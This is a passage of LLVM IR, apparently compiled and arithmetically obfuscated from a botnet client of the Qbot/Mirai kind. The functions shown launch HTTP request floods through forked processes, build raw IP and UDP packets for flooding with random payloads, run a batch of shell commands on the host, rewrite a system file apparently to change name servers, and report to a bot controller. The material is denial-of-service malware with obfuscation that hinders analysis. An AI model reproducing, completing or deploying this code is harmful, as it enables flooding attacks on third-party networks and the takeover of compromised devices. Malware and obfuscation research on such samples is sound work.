  br i1 %730, label %731, label %732

; <label>:731:                                    ; preds = %723
  br label %732

; <label>:732:                                    ; preds = %731, %723
  %733 = load i32, i32* %5, align 4
  %734 = sext i32 %733 to i64
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %734
  call void @reset_telstate(%struct.telstate_t* %735)
  br label %736

; <label>:736:                                    ; preds = %732, %709
  br label %737

; <label>:737:                                    ; preds = %736, %669, %563, %521, %469, %427, %378, %257, %107
  br label %738

; <label>:738:                                    ; preds = %737, %705, %651, %559, %547, %503, %465, %453, %409, %357, %353, %219, %188, %175
  %739 = load i32, i32* %5, align 4
  %740 = sub i32 %739, 19836360
  %741 = add i32 %740, 1
  %742 = add i32 %741, 19836360
  %743 = add nsw i32 %739, 1
  store i32 %742, i32* %5, align 4
  br label %89

; <label>:744:                                    ; preds = %89
  br label %87
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare void @srand(i32) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %22, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %29

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, -883295534
  %14 = add i32 %13, 65
  %15 = sub i32 %14, -883295534
  %16 = add i32 %12, 65
  %17 = trunc i32 %15 to i8
  %18 = load i8*, i8** %3, align 8
  %19 = load i32, i32* %5, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  store i8 %17, i8* %21, align 1
  br label %22

; <label>:22:                                     ; preds = %10
  %23 = load i32, i32* %5, align 4
  %24 = sub i32 0, %23
  %25 = sub i32 0, 1
  %26 = add i32 %24, %25
  %27 = sub i32 0, %26
  %28 = add nsw i32 %23, 1
  store i32 %27, i32* %5, align 4
  br label %6

; <label>:29:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %25

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 0, %14
  %16 = sub i64 0, %13
  %17 = add i64 %15, %16
  %18 = sub i64 0, %17
  %19 = add i64 %14, %13
  store i64 %18, i64* %5, align 8
  %20 = load i32, i32* %4, align 4
  %21 = add i32 %20, -1556303665
  %22 = sub i32 %21, 2
  %23 = sub i32 %22, -1556303665
  %24 = sub nsw i32 %20, 2
  store i32 %23, i32* %4, align 4
  br label %6

; <label>:25:                                     ; preds = %6
  %26 = load i32, i32* %4, align 4
  %27 = icmp sgt i32 %26, 0
  br i1 %27, label %28, label %38

; <label>:28:                                     ; preds = %25
  %29 = load i16*, i16** %3, align 8
  %30 = bitcast i16* %29 to i8*
  %31 = load i8, i8* %30, align 1
  %32 = zext i8 %31 to i64
  %33 = load i64, i64* %5, align 8
  %34 = sub i64 %33, 8639816537963334789
  %35 = add i64 %34, %32
  %36 = add i64 %35, 8639816537963334789
  %37 = add i64 %33, %32
  store i64 %36, i64* %5, align 8
  br label %38

; <label>:38:                                     ; preds = %28, %25
  br label %39

; <label>:39:                                     ; preds = %43, %38
  %40 = load i64, i64* %5, align 8
  %41 = lshr i64 %40, 16
  %42 = icmp ne i64 %41, 0
  br i1 %42, label %43, label %56

; <label>:43:                                     ; preds = %39
  %44 = load i64, i64* %5, align 8
  %45 = xor i64 65535, -1
  %46 = xor i64 %44, %45
  %47 = and i64 %46, %44
  %48 = and i64 %44, 65535
  %49 = load i64, i64* %5, align 8
  %50 = lshr i64 %49, 16
  %51 = sub i64 0, %47
  %52 = sub i64 0, %50
  %53 = add i64 %51, %52
  %54 = sub i64 0, %53
  %55 = add i64 %47, %50
  store i64 %54, i64* %5, align 8
  br label %39

; <label>:56:                                     ; preds = %39
  %57 = load i64, i64* %5, align 8
  %58 = xor i64 %57, -1
  %59 = and i64 474958167664556638, %58
  %60 = xor i64 474958167664556638, -1
  %61 = and i64 %57, %60
  %62 = xor i64 -1, -1
  %63 = and i64 %62, 474958167664556638
  %64 = and i64 -1, %60
  %65 = or i64 %59, %61
  %66 = or i64 %63, %64
  %67 = xor i64 %65, %66
  %68 = xor i64 %57, -1
  %69 = trunc i64 %67 to i16
  ret i16 %69
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #3
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #3
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #3
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = sub i64 0, %21
  %23 = sub i64 %19, %22
  %24 = add nsw i64 %19, %21
  %25 = trunc i64 %23 to i32
  store i32 %25, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %26

; <label>:26:                                     ; preds = %69, %6
  %27 = load i32, i32* %14, align 4
  %28 = load i32, i32* %12, align 4
  %29 = icmp slt i32 %27, %28
  br i1 %29, label %30, label %74

; <label>:30:                                     ; preds = %26
  %31 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %32 = load i8*, i8** %7, align 8
  %33 = load i8*, i8** %10, align 8
  %34 = load i8*, i8** %8, align 8
  %35 = call i32 @rand() #3
  %36 = srem i32 %35, 36
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %37
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 (i8*, i8*, ...) @sprintf(i8* %31, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.100, i32 0, i32 0), i8* %32, i8* %33, i8* %34, i8* %39) #3
  %41 = call i32 @fork() #3
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %43, label %68

; <label>:43:                                     ; preds = %30
  br label %44

; <label>:44:                                     ; preds = %66, %43
  %45 = load i32, i32* %15, align 4
  %46 = sext i32 %45 to i64
  %47 = call i64 @time(i64* null) #3
  %48 = icmp sgt i64 %46, %47
  br i1 %48, label %49, label %67

; <label>:49:                                     ; preds = %44
  %50 = load i8*, i8** %8, align 8
  %51 = load i16, i16* %9, align 2
  %52 = call i32 @socket_connect(i8* %50, i16 zeroext %51)
  store i32 %52, i32* %13, align 4
  %53 = load i32, i32* %13, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %55, label %66

; <label>:55:                                     ; preds = %49
  %56 = load i32, i32* %13, align 4
  %57 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %58 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %59 = call i64 @strlen(i8* %58) #9
  %60 = call i64 @write(i32 %56, i8* %57, i64 %59)
  %61 = load i32, i32* %13, align 4
  %62 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %63 = call i64 @read(i32 %61, i8* %62, i64 1)
  %64 = load i32, i32* %13, align 4
  %65 = call i32 @close(i32 %64)
  br label %66

; <label>:66:                                     ; preds = %55, %49
  br label %44

; <label>:67:                                     ; preds = %44
  call void @exit(i32 0) #11
  unreachable

; <label>:68:                                     ; preds = %30
  br label %69

; <label>:69:                                     ; preds = %68
  %70 = load i32, i32* %14, align 4
  %71 = sub i32 0, 1
  %72 = sub i32 %70, %71
  %73 = add nsw i32 %70, 1
  store i32 %72, i32* %14, align 4
  br label %26

; <label>:74:                                     ; preds = %26
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPHex(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i64 @time(i64* null) #3
  %21 = load i32, i32* %11, align 4
  %22 = sext i32 %21 to i64
  %23 = sub i64 %20, -7836605991818814160
  %24 = add i64 %23, %22
  %25 = add i64 %24, -7836605991818814160
  %26 = add nsw i64 %20, %22
  %27 = trunc i64 %25 to i32
  store i32 %27, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %28 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %29 = call i32 (i8*, i8*, ...) @sprintf(i8* %28, i8* getelementptr inbounds ([265 x i8], [265 x i8]* @.str.101, i32 0, i32 0)) #3
  store i32 0, i32* %14, align 4
  br label %30

; <label>:30:                                     ; preds = %73, %6
  %31 = load i32, i32* %14, align 4
  %32 = load i32, i32* %12, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %79

; <label>:34:                                     ; preds = %30
  %35 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %36 = load i8*, i8** %7, align 8
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %38 = load i8*, i8** %8, align 8
  %39 = call i32 @rand() #3
  %40 = srem i32 %39, 36
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %41
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 (i8*, i8*, ...) @sprintf(i8* %35, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.100, i32 0, i32 0), i8* %36, i8* %37, i8* %38, i8* %43) #3
  %45 = call i32 @fork() #3
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %47, label %72

; <label>:47:                                     ; preds = %34
  br label %48

; <label>:48:                                     ; preds = %70, %47
  %49 = load i32, i32* %15, align 4
  %50 = sext i32 %49 to i64
  %51 = call i64 @time(i64* null) #3
  %52 = icmp sgt i64 %50, %51
  br i1 %52, label %53, label %71

; <label>:53:                                     ; preds = %48
  %54 = load i8*, i8** %8, align 8
  %55 = load i16, i16* %9, align 2
  %56 = call i32 @socket_connect(i8* %54, i16 zeroext %55)
  store i32 %56, i32* %13, align 4
  %57 = load i32, i32* %13, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %59, label %70

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %13, align 4
  %61 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %62 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %63 = call i64 @strlen(i8* %62) #9
  %64 = call i64 @write(i32 %60, i8* %61, i64 %63)
  %65 = load i32, i32* %13, align 4
  %66 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %67 = call i64 @read(i32 %65, i8* %66, i64 1)
  %68 = load i32, i32* %13, align 4
  %69 = call i32 @close(i32 %68)
  br label %70

; <label>:70:                                     ; preds = %59, %53
  br label %48

; <label>:71:                                     ; preds = %48
  call void @exit(i32 0) #11
  unreachable

; <label>:72:                                     ; preds = %34
  br label %73

; <label>:73:                                     ; preds = %72
  %74 = load i32, i32* %14, align 4
  %75 = add i32 %74, 518735625
  %76 = add i32 %75, 1
  %77 = sub i32 %76, 518735625
  %78 = add nsw i32 %74, 1
  store i32 %77, i32* %14, align 4
  br label %30

; <label>:79:                                     ; preds = %30
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 -16, -1
  %15 = xor i8 %13, %14
  %16 = and i8 %15, %13
  %17 = and i8 %13, -16
  %18 = xor i8 %16, -1
  %19 = xor i8 5, -1
  %20 = xor i8 127, -1
  %21 = and i8 %18, 127
  %22 = and i8 %16, %20
  %23 = and i8 %19, 127
  %24 = and i8 5, %20
  %25 = or i8 %21, %22
  %26 = or i8 %23, %24
  %27 = xor i8 %25, %26
  %28 = or i8 %18, %19
  %29 = xor i8 %28, -1
  %30 = or i8 127, %20
  %31 = and i8 %29, %30
  %32 = or i8 %27, %31
  %33 = or i8 %16, 5
  store i8 %32, i8* %12, align 4
  %34 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %35 = bitcast %struct.iphdr* %34 to i8*
  %36 = load i8, i8* %35, align 4
  %37 = xor i8 15, -1
  %38 = xor i8 %36, %37
  %39 = and i8 %38, %36
  %40 = and i8 %36, 15
  %41 = xor i8 %39, -1
  %42 = xor i8 64, -1
  %43 = xor i8 0, -1
  %44 = and i8 %41, 0
  %45 = and i8 %39, %43
  %46 = and i8 %42, 0
  %47 = and i8 64, %43
  %48 = or i8 %44, %45
  %49 = or i8 %46, %47
  %50 = xor i8 %48, %49
  %51 = or i8 %41, %42
  %52 = xor i8 %51, -1
  %53 = or i8 0, %43
  %54 = and i8 %52, %53
  %55 = or i8 %50, %54
  %56 = or i8 %39, 64
  store i8 %55, i8* %35, align 4
  %57 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %58 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %57, i32 0, i32 1
  store i8 0, i8* %58, align 1
  %59 = load i32, i32* %10, align 4
  %60 = sext i32 %59 to i64
  %61 = sub i64 20, -837912568088981844
  %62 = add i64 %61, %60
  %63 = add i64 %62, -837912568088981844
  %64 = add i64 20, %60
  %65 = trunc i64 %63 to i16
  %66 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %67 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %66, i32 0, i32 2
  store i16 %65, i16* %67, align 2
  %68 = call i32 @rand_cmwc()
  %69 = trunc i32 %68 to i16
  %70 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %71 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %70, i32 0, i32 3
  store i16 %69, i16* %71, align 4
  %72 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %73 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %72, i32 0, i32 4
  store i16 0, i16* %73, align 2
  %74 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %75 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %74, i32 0, i32 5
  store i8 -1, i8* %75, align 4
  %76 = load i8, i8* %9, align 1
  %77 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %78 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %77, i32 0, i32 6
  store i8 %76, i8* %78, align 1
  %79 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %80 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %79, i32 0, i32 7
  store i16 0, i16* %80, align 2
  %81 = load i32, i32* %8, align 4
  %82 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %83 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %82, i32 0, i32 8
  store i32 %81, i32* %83, align 4
  %84 = load i32, i32* %7, align 4
  %85 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i32 0, i32 9
  store i32 %84, i32* %86, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.102, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.102, i32 0, i32 0), i32 0) #3
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %16

; <label>:8:                                      ; preds = %0
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.103, i32 0, i32 0), i8** %2, align 8
  %9 = load i8*, i8** %2, align 8
  %10 = call i64 @strlen(i8* %9) #9
  store i64 %10, i64* %3, align 8
  %11 = load i16, i16* %1, align 2
  %12 = zext i16 %11 to i32
  %13 = load i8*, i8** %2, align 8
  %14 = load i64, i64* %3, align 8
  %15 = call i64 @write(i32 %12, i8* %13, i64 %14)
  br label %17

; <label>:16:                                     ; preds = %0
  br label %21

; <label>:17:                                     ; preds = %8
  %18 = load i16, i16* %1, align 2
  %19 = zext i16 %18 to i32
  %20 = call i32 @close(i32 %19)
  br label %21

; <label>:21:                                     ; preds = %17, %16
  ret void
}

declare i32 @open(i8*, i32, ...) #2

; Function Attrs: noinline nounwind uwtable
define void @CleanDevice() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.104, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.105, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.106, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.107, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.108, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.109, i32 0, i32 0))
  %7 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.110, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.111, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.112, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.113, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.114, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.115, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.116, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %37, label %41

; <label>:37:                                     ; preds = %8
  %38 = call i32 @rand_cmwc()
  %39 = trunc i32 %38 to i16
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %46

; <label>:41:                                     ; preds = %8
  %42 = load i32, i32* %10, align 4
  %43 = trunc i32 %42 to i16
  %44 = call zeroext i16 @htons(i16 zeroext %43) #10
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  br label %46

; <label>:46:                                     ; preds = %41, %37
  %47 = load i8*, i8** %9, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  br label %362

; <label>:52:                                     ; preds = %46
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = load i32, i32* %14, align 4
  store i32 %55, i32* %18, align 4
  %56 = load i32, i32* %12, align 4
  %57 = icmp eq i32 %56, 32
  br i1 %57, label %58, label %139

; <label>:58:                                     ; preds = %52
  %59 = call i32 @socket(i32 2, i32 2, i32 17) #3
  store i32 %59, i32* %19, align 4
  %60 = load i32, i32* %19, align 4
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %65, label %62

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* @KadenCommStock, align 4
  %64 = call i32 (i32, i8*, ...) @botnetPrint(i32 %63, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.117, i32 0, i32 0))
  br label %362

; <label>:65:                                     ; preds = %58
  %66 = load i32, i32* %13, align 4
  %67 = sub i32 0, 1
  %68 = sub i32 %66, %67
  %69 = add nsw i32 %66, 1
  %70 = sext i32 %68 to i64
  %71 = call noalias i8* @malloc(i64 %70) #3
  store i8* %71, i8** %20, align 8
  %72 = load i8*, i8** %20, align 8
  %73 = icmp eq i8* %72, null
  br i1 %73, label %74, label %75

; <label>:74:                                     ; preds = %65
  br label %362

; <label>:75:                                     ; preds = %65
  %76 = load i8*, i8** %20, align 8
  %77 = load i32, i32* %13, align 4
  %78 = sub i32 0, %77
  %79 = sub i32 0, 1
  %80 = add i32 %78, %79
  %81 = sub i32 0, %80
  %82 = add nsw i32 %77, 1
  %83 = sext i32 %81 to i64
  call void @llvm.memset.p0i8.i64(i8* %76, i8 0, i64 %83, i32 1, i1 false)
  %84 = load i8*, i8** %20, align 8
  %85 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %84, i32 %85)
  %86 = call i64 @time(i64* null) #3
  %87 = load i32, i32* %11, align 4
  %88 = sext i32 %87 to i64
  %89 = sub i64 0, %86
  %90 = sub i64 0, %88
  %91 = add i64 %89, %90
  %92 = sub i64 0, %91
  %93 = add nsw i64 %86, %88
  %94 = trunc i64 %92 to i32
  store i32 %94, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %95

; <label>:95:                                     ; preds = %132, %128, %118, %75
  %96 = load i32, i32* %19, align 4
  %97 = load i8*, i8** %20, align 8
  %98 = load i32, i32* %13, align 4
  %99 = sext i32 %98 to i64
  %100 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %101 = call i64 @sendto(i32 %96, i8* %97, i64 %99, i32 0, %struct.sockaddr* %100, i32 16)
  %102 = load i32, i32* %22, align 4
  %103 = load i32, i32* %18, align 4
  %104 = icmp eq i32 %102, %103
  br i1 %104, label %105, label %119

; <label>:105:                                    ; preds = %95
  %106 = load i32, i32* %10, align 4
  %107 = icmp eq i32 %106, 0
  br i1 %107, label %108, label %112

; <label>:108:                                    ; preds = %105
  %109 = call i32 @rand_cmwc()
